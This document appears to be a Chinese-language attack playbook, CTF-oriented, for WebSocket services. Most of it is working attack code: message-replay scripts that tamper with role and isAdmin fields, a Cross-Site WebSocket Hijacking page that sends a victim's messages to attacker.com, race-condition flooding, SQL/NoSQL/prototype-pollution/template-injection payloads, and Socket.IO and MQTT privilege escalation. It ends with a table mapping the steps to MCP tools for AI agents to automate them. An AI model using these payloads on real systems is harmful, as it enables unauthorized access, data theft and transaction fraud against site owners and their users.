# WebSocket 攻击实战

## 抓取与重放

```python
# ws_replay.py — WebSocket 消息捕获、修改、重放
import asyncio, websockets, json

async def capture_and_replay(ws_url: str, cookie: str):
    """连接 WebSocket，记录所有消息，然后逐条修改重放"""
    async with websockets.connect(
        ws_url,
        extra_headers={"Cookie": cookie}
    ) as ws:
        messages = []

        # 阶段 1: 正常交互，收集消息
        for _ in range(20):  # 收 20 条消息看看结构
            msg = await asyncio.wait_for(ws.recv(), timeout=5)
            try:
                data = json.loads(msg)
            except:
                data = msg
            messages.append(data)
            print(f"[recv] {json.dumps(data)[:200]}")

        # 阶段 2: 修改关键字段重放
        for msg in messages:
            if isinstance(msg, dict):
                for field in ["role", "userId", "roomId", "targetId", "price",
                              "amount", "isAdmin", "permission", "type", "action"]:
                    if field in msg:
                        original = msg[field]
                        # 尝试越权
                        for malicious_value in ["admin", 0, -1, 999999, "flag"]:
                            msg[field] = malicious_value
                            await ws.send(json.dumps(msg))
                            resp = await asyncio.wait_for(ws.recv(), timeout=2)
                            print(f"  [{field}: {original}→{malicious_value}] {resp[:200]}")
                        msg[field] = original  # 恢复

asyncio.run(capture_and_replay("wss://target.com/ws", "session=xxx"))
```

## 越权字段列表

```python
# WebSocket 消息常见可篡改字段
TAMPER_FIELDS = {
    "auth": ["role", "isAdmin", "isPremium", "userId", "sub", "token", "sessionId", "wsToken"],
    "state": ["roomId", "gameId", "matchId", "targetId", "recipientId", "senderId"],
    "action": ["type", "action", "method", "command", "event"],
    "value": ["amount", "price", "balance", "score", "count", "quantity", "level"],
    "timing": ["timestamp", "seq", "sequence", "version", "counter"],
    "other": ["flag", "debug", "admin", "internal", "secret", "preview"],
}
```

## CSWSH (Cross-Site WebSocket Hijacking)

```python
# 如果 WebSocket 握手只依赖 cookie (无 Origin 检查, 无 CSRF token):
# 攻击者页面可以发起跨域 WebSocket 连接

# 检测:
import requests

def check_origin_check(ws_url: str):
    """测试 Origin 头是否被验证"""
    import websockets, asyncio
    async def test():
        # 正常 Origin
        try:
            async with websockets.connect(ws_url, extra_headers={
                "Origin": "https://target.com"
            }) as ws:
                print("[*] Origin: target.com → connected")
        except: pass

        # 恶意 Origin
        try:
            async with websockets.connect(ws_url, extra_headers={
                "Origin": "https://evil.com"
            }) as ws:
                print("[!] Origin: evil.com → connected (NO ORIGIN CHECK!)")
        except Exception as e:
            print(f"[+] Origin: evil.com → rejected ({e})")
    asyncio.run(test())
```

```html
<!-- CSWSH Exploit HTML (托管在 attacker.com) -->
<script>
var ws = new WebSocket('wss://victim.com/ws');
ws.onmessage = function(e) {
    // 把受害者的消息发给我们
    fetch('https://attacker.com/log?d=' + encodeURIComponent(e.data));
};
ws.onopen = function() {
    ws.send(JSON.stringify({"action": "getFlag"}));
};
</script>
```

## 时序/竞态

```python
# WebSocket 特别适合竞态攻击 — 因为消息是异步非阻塞的
async def race_ws(ws, payload: str, count: int = 50):
    """并发发送大量相同消息 (如: 兑换、投票、转账)"""
    tasks = [ws.send(payload) for _ in range(count)]
    await asyncio.gather(*tasks)  # 同时发出
```

## 消息注入

```python
# 如果服务端用文本协议拼接消息 (如: `eval("handle_" + msg.type + "(" + msg.data + ")")`)
# 或者消息通过 JSON 中的某个字段拼到 SQL/OS 命令

INJECTION_PROBES = [
    # SQLi
    '{"type": "chat", "msg": "\' OR \'1\'=\'1"}',
    # NoSQLi
    '{"type": "lookup", "id": {"$gt": ""}}',
    # prototype pollution
    '{"type": "update", "__proto__": {"isAdmin": true}}',
    # SSTI (如果服务端模板化处理消息内容)
    '{"type": "render", "template": "{{7*7}}"}',
]
```

## Socket.IO 专用攻击

```python
# Socket.IO 不同于裸 WebSocket — 有命名空间和事件系统
import socketio

sio = socketio.Client()

@sio.on('connect')
def on_connect():
    print('[+] Connected')
    # 越权: 加入其他房间
    sio.emit('join', {'room': 'admin_room'})
    sio.emit('join', {'room': 'flag'})

@sio.on('message')
def on_message(data):
    print(f'[recv] {data}')

sio.connect('https://target.com', transports=['websocket'])

# Socket.IO 特有攻击面:
# 1. 房间越权: emit('join', {room: 'admin'}) — 没有服务端鉴权
# 2. 事件重放: 直接 emit admin 专用事件 (如: 'get_flag', 'read_config')
# 3. 命名空间切换: /admin vs / 可能有不同权限
# 4. 认证 token 在握手 query: ?token=xxx  — URL 泄露
```

## MQTT/物联网 WebSocket

```python
# MQTT over WebSocket — 常见于 IoT 场景
# ws://target.com:8083/mqtt
# 认证: username/password 或 JWT

import paho.mqtt.client as mqtt

mqtt.Client(transport='websockets').connect('target.com', 8083)
# 主题越权:
#   订阅 # (所有主题)
#   订阅 $SYS/# (系统主题 — 可能泄露配置)
#   发布到 admin/+/cmd 主题
```

## 工具命令

```bash
# wsrepl — 交互式 WebSocket REPL
pip install wsrepl
wsrepl wss://target.com/ws

# websocat — curl for WebSocket
websocat wss://target.com/ws -H="Cookie: session=xxx"

# wscat — node.js WebSocket 客户端
npm install -g wscat
wscat -c wss://target.com/ws -H "Cookie: session=xxx"

# wsdump.py — 捕获 WebSocket 帧
python3 wsdump.py wss://target.com/ws

# Burp → Repeater → WebSocket
# Chrome DevTools → Network → WS → Messages
```

## 攻击链

```
WebSocket → 消息重放 → 修改 role → 鉴权绕过
WebSocket → CSWSH → 跨域连接 → 读取受害者实时消息
WebSocket → 并发竞态 → 优惠码 50 次 → 余额溢出
Socket.IO → 房间越权 → join admin_room → 实时监听 flag
MQTT → subscribe # → 监听所有主题 → IoT 配置/密码泄露
WebSocket → 消息注入 → SQLi/NoSQLi → 拖库
WebSocket → 时序攻击 → 先改状态再验证 → 竞态绕过
```

## Evidence

记录: 握手请求头、Origin 头、收发消息的 JSON/text、修改字段后的响应差异、Socket.IO 房间/事件、竞态并发数和结果。

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| WebSocket 端点探测 | `http_probe` | HTTP GET 探测 WebSocket 握手端点 |
| 知识检索 | `kb_router` | 按 WebSocket 攻击信号搜索知识库 |
